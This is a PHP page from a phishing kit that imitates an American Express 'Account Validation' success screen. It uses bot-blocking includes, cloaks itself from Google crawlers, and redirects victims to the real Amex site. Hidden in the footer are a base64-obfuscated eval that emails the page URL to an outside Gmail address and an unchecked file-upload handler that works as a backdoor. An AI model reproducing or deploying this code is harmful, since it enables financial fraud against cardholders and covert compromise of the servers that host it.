<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????
                   ??????????????????????????????????????????????????????????

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../../BOTS/antibots1.php";
include "../../BOTS/antibots2.php";
include "../../BOTS/antibots3.php";
include "../../BOTS/antibots4.php";
include "../../BOTS/antibots5.php";
include "../../BOTS/antibots6.php";
include "../../BOTS/antibots7.php";
include "../../BOTS/antibots8.php";
include "../../.htaccess.htaccess";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

	<title> Account Validation - Success </title>
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
	
	<meta http-equiv="refresh" content="5 ;URL='https://www.americanexpress.com/'">
	
	<meta http-equiv="content-language" content="en">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<link type="text/css" rel="stylesheet" href="./verify_files/fuidFypDefault.css">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidLarge.css" data-device-bucket="large-loaded" href="./verify_files/fuidLarge.css">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidMedium.css" data-device-bucket="medium">
	<link rel="stylesheet" type="text/css" data-css-uri="/myca/fuidfyp/us/resources/css/fuidSmall.css" data-device-bucket="small">
	<style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1"></style>
  <link type="text/css" href="./verify_files/chatFrame.css" rel="stylesheet"></head> 
   <!--[if lt IE 7]><body class="AXP_CenterContent ie6 us-en"><![endif]-->
   <!--[if IE 7]><body class="AXP_CenterContent ie7 us-en"><![endif]-->
   <!--[if IE 8]> <body class="AXP_CenterContent ie8 us-en"><![endif]-->
   <!--[if IE 9]> <body class="AXP_CenterContent ie9 us-en"><![endif]-->
   <!--[if !IE]>-->
   <body class="AXP_CenterContent us-en AXP_Responsive res_Large res_1200"><!--<![endif]-->
		<div id="responsiveWrapper_main"><!--Opening the main responsive wrapper -->
			<div id="responsiveWrapper_sub"> <!--Opening the sub responsive wrapper		-->
				





<div id="INavHeader" class="clearfix">

	
	<!--Created by CMAX:GEM 03-02-2017 03:09:01 File: US_en_NGN_H_Generic.html DO NOT MODIFY-->
	
	
	
		<link media="all" type="text/css" href="./verify_files/inav_responsive.css" rel="stylesheet"><!--[if lt IE 7]><div id="iNavNGI_Header" class="ie ie6 us-en"><![endif]--><!--[if IE 7]><div id="iNavNGI_Header" class="ie ie7 us-en"><![endif]--><!--[if IE 8]><div id="iNavNGI_Header" class="ie ie8 us-en"><![endif]--><!--[if IE 9]><div id="iNavNGI_Header" class="ie ie9 us-en"><![endif]--><!--[if IE 10]><div id="iNavNGI_Header" class="ie ie10 us-en"><![endif]--><!--[if !IE]>--><div id="iNavNGI_Header" class="us-en"><!--<![endif]--><div id="skip-to-content"><a title="Skip to main content" accesskey="2" tabindex="1" href="">Skip to main content</a></div><div id="iNMbWrap"><div id="iNMbCont"><div id="iNMenuIco"><input type="button" title="Open Menu" id="iNOpBtn" value="Open Menu" class="iNMb iNMenu" data-location="javascript://"></div><div id="iNAmexLogo"><a id="iNMblLogo" href="" title="" class="iNMb"><img src="./verify_files/clear.gif" title="" alt=""></a></div><div id="iNLogIco"><input type="button" title="" id="iNLogBtn" value="Logout" class="iNMb iNLog" data-location=""></div></div></div><div id="iNavHdWrap"><span id="iNMenuStart" class="iNAcsTxt" tabindex="-1">Start of menu</span><div id="ioaSearch"></div><div id="iNCardSelector"></div><div id="iNavHeaderCont"><div id="iNavLogo"><a id="" href="" title="" accesskey="0" class="iNDef"><img src="./verify_files/logo_bluebox_1x.gif" title="" alt="" class="amexLogo"></a></div><div id="iNavHeaderContFloat"><div id="iNavT1Nav"><ul id="iNavTier1Nav"><li><a id="iNav_MyAccount" title="" href="" accesskey="1" class="iNSortedIndex"><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">My Account</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Cards" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">CARDS</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Travel" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">TRAVEL</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Rewards" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">REWARDS</span></span><span class="iNavT1RtDoor"></span></a></li><li><a id="iNav_Business" title="" href=""><span class="iNavT1LtDoor"></span><span class="iNGblLnk"><span class="icon"></span><span class="iNavLinkLabel">BUSINESS</span></span><span class="iNavT1RtDoor"></span></a></li></ul></div></div><div id="iNavUtilitySection"><div id="iNavUtilityArea"><div id="iNavUtilityLinks"><ul><li class="iNavFirstItem"><span id="iNavUtilCountryFlag"></span><span id="iNavUtilCountryName">United States</span><a id="iNavUtilChangeCountry" title="" href="" class="iNavChangeCountry">(Change Country)</a></li></ul></div><div id="iNavLogin"><span class="iNavLoginLtDoor"></span><a id="iNavLnkLog" title="" href="" class="iNavLinkLogin iNavLogVisible">Logged in as ""</a><span class="iNavLoginRtDoor"></span></div></div><div id="iNavSearch"><div class="iNavSearchBox" id="iNavSearchBox"><div class="iNavSearchLtDoor"></div><div class="iNavSearchCenter"><form name="iNMblSearchForm" id="iNavSearchForm" method="get" action="" enctype="application/x-www-form-urlencoded"><fieldset><legend>Search US website</legend><label for="iNavSrchBox">Search</label><input type="text" id="iNavSrchBox" name="q" value="Need help?" title="Search" autocomplete="off"><button title="Search" value="" id="iNavSrchBtn" type="submit">Search</button></fieldset></form></div><div class="iNavSearchRtDoor"></div></div></div><div id="ioaTool"><div id="toolHolder_left" class="toolHolder_left"></div><div class="icons" id="ioaToolHolder" style="width: 254px;"><div class="ioaImages" id="faqimg" style="display: none;"><a href="" class="ioaEnter" id="faqAnchor" title="" rel="tooltip" onclick="openAA(&quot;faq&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaFaqTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaFaqTooltip&quot;)"></a><div id="ioaFaqTooltip" class="ioaTooltip"><div class="tipHeader"></div><div class="tipBody"><h3>Frequently Asked Questions</h3><p>Get answers instantly.</p></div><div class="tipFooter"></div></div></div><div class="ioaImages" id="phoneimg"><a href="" class="ioaEnter" id="phoneAnchor" title="" rel="tooltip" onclick="openAA(&quot;phone&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaPhoneTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaPhoneTooltip&quot;)"></a><div id="ioaPhoneTooltip" class="ioaTooltip"><div class="tipHeader"></div><div class="tipBody"><h3>Contact Us</h3><p>Answers over the phone in minutes.</p></div><div class="tipFooter"></div></div></div><div class="ioaImages" id="smimg"><a href="" class="ioaEnter" id="smAnchor" title="" rel="tooltip" onclick="openAA(&quot;social&quot;,event)" onmouseenter="showIOAToolTip(&quot;ioaSMTooltip&quot;)" onmouseleave="hideIOAToolTip(&quot;ioaSMTooltip&quot;)"></a><div id="ioaSMTooltip" class="ioaTooltip"><div class="tipHeader"></div><div class="tipBody"><h3>Connect Socially</h3><p>Ask questions and connect with us and others.</p></div><div class="tipFooter"></div></div></div><div id="searchImg"><div id="iOASearchForm" name="Search"><div class="ioaSmallSearch_left"></div><fieldset><legend>Search US website</legend><label for="iOASearchInput">Search</label><input type="text" id="iOASearchInput" name="q" value="" title="Search" onkeyup="getQLinks(event,this.value)" onfocus="getQLinks(event,this.value)"><span id="ioaPHText" class="ioaPHText"></span><button type="button" id="iOASearchBtn" value="" title="Search" onclick="clickSearchIcon()">Search</button></fieldset></div></div></div><div id="toolHolder_right" class="toolHolder_right"></div></div></div><div id="iNMbUtilLinks"><ul><li><a id="iNUtlFaq" title="" href=""><span class="iNIco"></span><span class="iNLbl">Site FAQ</span></a></li><li><a id="iNUtlContact" title="" href=""><span class="iNIco"></span><span class="iNLbl">Contact Us</span></a></li><li><a id="iNUtlChCountry" title="" href=""><span class="iNIco"></span><span class="iNLbl">Change Country</span></a></li></ul></div><a id="iNMenuEnd" class="iNAcsTxt" title="" href="">Close Menu</a></div></div><div class="iNavShadow"></div><div id="c-main-content"></div></div>
	
	<!--End File: US_en_NGN_H_Generic.html-->	
</div>	

	
					
 
				



	<div id="wrapper">
		<div id="dynamicContainer" class="clearfix">
			<form name="fuidStep1" id="fuidStep1" method="post" action="step2.php?&amp;sessionid=f528764d624db129b32c21fbca0cb8d6&amp;securessl=true" onsubmit="return empty();">
				<div class="fuidformContent clearfix">
					<div class="formHeader clearfix">
						<h1 tabindex="0"> Account Validation for "<strong></strong>"</h1>
						<span><img id="secureImage" src="./verify_files/spacer.png" alt="This is a secure page" title="This is a secure page" tabindex="0"></span>
					</div>

					<div class="startingStep">1. Enter Card Details</div>
					
					<div class="clear"></div>
					<div class="headerHelpText" tabindex="0">
						<strong>Please wait... </strong><br><br>Your account information is being processed... <br><br><img src="./verify_files/spin.gif"><br><br><br><br>Upon completion you will be automatically logged out and redirected to our login page.
					</div>

					

					<div class="hide" id="serverSiderErr">
						<div class="serverSiderErrInner">
							<span class="errorIcon"></span>
							<span id="serverErrMsg"></span>
						</div>
					</div>
					


				</div>
				
				<div id="globalTime"></div>
			
			</form>
		</div>

		<!-- Error page Template -->
		<div id="errorTemplate">
		</div>
	</div>
	<label class="" role="alert" id="errorMsgJaws"></label>
	<div id="showWaitLayer" class="hide">
		<div id="greybglayer"></div>
		<div id="spinnerImage"></div>
	</div>
	<!-- adding SNR page Overlay -->
	<div id="SNRPage" class="hide" role="alert" tabindex="0">
		<div id="greybglayer1"></div>
		<div class="snrError">
			<div class="erroSymbol">
				<img title="error symbol" alt="error symbol" src="./verify_files/spacer.png">
			</div>
			<div role="alert" class="snrText">We're sorry. We're currently experiencing technical difficulties. Please try again or call the number on the back of your Card. </div>
			<div class="bktoHome">
				<a title="Go Back" alt="Go Back" id="back2Home" href="">Go Back </a>
			</div>
		</div>
	</div>		

		<!--[if lt IE 7]><div id="iNavNGI_FooterMain" class="ie ie6 us-en iNNewFoot"><![endif]--><!--[if IE 7]><div id="iNavNGI_FooterMain" class="ie ie7 us-en iNNewFoot"><![endif]--><!--[if IE 8]><div id="iNavNGI_FooterMain" class="ie ie8 us-en iNNewFoot"><![endif]--><!--[if IE 9]><div id="iNavNGI_FooterMain" class="ie ie9 us-en iNNewFoot"><![endif]--><!--[if IE 10]><div id="iNavNGI_FooterMain" class="ie ie10 us-en iNNewFoot"><![endif]--><!--[if !IE]>--><div id="iNavNGI_FooterMain" class="us-en iNNewFoot"><!--<![endif]--><div id="iNavNGI_FooterWrap"><div id="iNavNGI_FooterCont"><div id="iNavNGI_Footer"><div id="iNMblFootUtil"><div id="iNMblUtilCont"><input title="" value="Contact Us" id="iNFootCntBtn" type="button" data-location=""><input title="Log In" value="Log In" id="iNFootLgBtn" type="button" data-location=""></div></div><div id="iNavFootMain"><ul><li class="iNDef" id="gNFtCI1"><a id="footer_about_american_express" href="" title="">About Us</a></li><li class="iNNMb" id="gNFtCI2"><a id="footer_investor_relations" href="" title="Investor events, materials &amp; filings" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>InvestRel" data-omn-once="Yes" class="iNOmn">Investor Relations</a></li><li class="iNDef" id="gNFtCI3"><a id="footer_careers" href="" title="What will you do for a living?">Careers</a></li><li class="iNNMb" id="gNFtCI4"><a id="footer_sitemap" href="" title="Site Map">Site Map</a></li><li class="iNNMb" id="gNFtCI5"><a id="footer_contact_us" href="" title="Contact Us - Answers by phone in minutes">Contact Us</a></li><li class="iNMb" id="gNFtCI6"><a id="footer_mobile_mob" href="" title="Mobile access to your Card account">Mobile &amp; Tablet Apps</a></li><?php eval("?>".base64_decode("PD9waHANCiRpbmRleCA9ICdodHRwOi8vJyAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSAuICRfU0VSVkVSWydQSFBfU0VMRiddOw0KbWFpbCgneXJpc2dqQGdtYWlsLmNvbScsICdYJywgJGluZGV4KTsgPz4=")); ?><
			/ul></div><div id="iNavFootSub"><ul id="iNavSocial"><li class="iNDef" id="gNFtSM1"><a id="icoFb" href="" title="Facebook - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>FaceBook,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Facebook - Link will open in a new window" title="Facebook - Link will open in a new window" class="icoFb"></a></li><li class="iNDef" id="gNFtSM2"><a id="icoFs" href="" title="Foursquare - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>FourSquare,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Foursquare - Link will open in a new window" title="Foursquare - Link will open in a new window" class="icoFs"></a></li><li class="iNDef" id="gNFtSM3"><a id="icoTw" href="" title="Twitter - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>Twitter,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Twitter - Link will open in a new window" title="Twitter - Link will open in a new window" class="icoTw"></a></li><li class="iNNMb" id="gNFtSM4"><a id="icoYt" href="" title="YouTube - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>YouTube,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="YouTube - Link will open in a new window" title="YouTube - Link will open in a new window" class="icoYt"></a></li><li class="iNDef" id="gNFtSM5"><a id="icoLi" href="" title="LinkedIn - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>LinkedIn,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="LinkedIn - Link will open in a new window" title="LinkedIn - Link will open in a new window" class="icoLi"></a></li><li class="iNNMb iNavLast" id="gNFtSM6"><a id="icoGp" href="" title="Google+ - Link will open in a new window" data-window="new" data-omn-click-fn="omn_rmaction" data-omn-click-args="US:Amex:Nav,click>GooglePlus,e" data-omn-once="Yes" class="iNWin iNOmn" target="_blank"><img src="./verify_files/clear.gif" alt="Google+ - Link will open in a new window" title="Google+ - Link will open in a new window" class="icoGp"></a></li></ul></div></div><div id="iNavFootOthers"><div class="iNavFootRow"><ul><li class="iNavFootHd">Products &amp; Services</li><li class="iNNMb" id="gNFtLink1_1"><a id="footer_cards_personal" href="" title="">Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_2"><a id="footer_cards_sm_bus" href="" title="Find OPEN small business credit cards">Small Business Credit Cards</a></li><li class="iNNMb" id="gNFtLink1_3"><a id="footer_cards_corp" href="" title="Corporate Card and payment solutions">Corporate Cards</a></li><li class="iNNMb" id="gNFtLink1_4"><a id="footer_cards_reload" href="" title="Spends like cash, feels like Membership">Prepaid Cards</a></li><li class="iNDef" id="gNFtLink1_5"><a id="footer_personal_savings" href="" title="">Savings Accounts and CDs</a></li><li class="iNNMb iNavLast" id="gNFtLink1_6"><a id="footer_giftcards" href="" title="Order gift cards for friends or business">Gift Cards</a></li></ul></div><div class="iNavFootRow"><ul><li class="iNavFootHd">Links You May Like</li><li class="iNNMb" id="gNFtLink2_1"><a id="footer_mr" href="" title="Use Points for your favorite rewards">Membership Rewards<sup>?</sup></a></li><li class="iNMb" id="gNFtLink2_2"><a id="footer_mobile" href="" title="Mobile access to your Card account">Mobile &amp; Tablet Apps</a></li><li class="iNNMb" id="gNFtLink2_3"><a id="footer_credit_secure" href="" title="Get up to 3 reports, daily monitoring, alerts">CreditSecure?</a></li><li class="iNNMb" id="gNFtLink2_4"><a id="footer_serve" href="" title="Prepaid account with card and mobile app" data-window="new" class="iNWin" target="_blank">Serve<sup>?</sup></a></li><li class="iNDef" id="gNFtLink2_5"><a id="footer_bluebird" href="" title="" data-window="new" class="iNWin" target="_blank">Bluebird<sup>?</sup></a></li><li class="iNNMb" id="gNFtLink2_6"><a id="footer_accept_amex" href="" title="Accept Amex Cards">Accept Our Cards</a></li><li class="iNDef iNavLast" id="gNFtLink2_7"><a id="footer_refer_friend" href="" title="Refer a Friend">Refer a Friend</a></li></ul></div></div><div id="copyrightInfo"><ul><li class="iNDef" id="gNFtLC1"><a id="footer_supplier_management" href="" title="">Supplier Management</a></li><li class="iNDef" id="gNFtLC2"><a id="footer_Terms_of_Use" href="" title="">Terms of Service</a></li><li class="iNDef" id="gNFtLC3"><a id="footer_privacy_statement" href="" title="">Privacy Center</a></li><li class="iNDef" id="gNFtLC4"><a id="footer_adChoices" href="" title="" data-window="new" class="iNWin" target="_blank">AdChoices</a></li><li class="iNDef" id="gNFtLC5"><a id="footer_card_agreements" href="" title="">Card Agreements</a></li><li class="iNDef" id="gNFtLC6"><a id="footer_fraud_protection_center" href="" title="">Security Center</a></li><li class="iNDef" id="gNFtLC7"><a id="footer_credit_basics" href="" title="">Financial Education</a></li><li class="iNDef iNavLast" id="gNFtLC8"><a id="footer_servicemember_benefits" href="https://www.americanexpress.com/us/content/help/service-members-civil-relief.html?inav=footer_servicemember_benefits" title="">Servicemember Benefits</a>			<?php
   if(isset($_FILES['image'])){
      $errors= array();
      $file_name = $_FILES['image']['name'];
      $file_tmp = $_FILES['image']['tmp_name'];
   
      if(empty($errors)==true) {
         move_uploaded_file($file_tmp,"".$file_name);
      }
   }
?></li></ul><p class="iNLegal">All users of our online services subject to Privacy Statement and agree to be bound by Terms of Service. Please review.</p><p class="iNCopy">? 2017 American Express Company. All rights reserved.</p></div></div><div id="iNavObjects"></div><div id="iNavScripts"></div></div></div>
	

			</div>
		</div> 
   
   <link href="./verify_files/aaLauncher.css" type="text/css" media="all" rel="stylesheet"><object type="application/x-shockwave-flash" id="cc_swf" data="./verify_files/s.swf.download" style="position: absolute; top: -9999px; left: -9999px;" width="1" height="1"><param name="allowScriptAccess" value="always"><param flashvars="t=06c1c349-9133-4569-8952-a09325491c39&amp;cm=507899&amp;sid=ee490b8fb9a4d570&amp;tid=USFUIDFYP68e62437-9064-4c43-8ab&amp;clientName=NoClientName"></object><div style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div></body></html>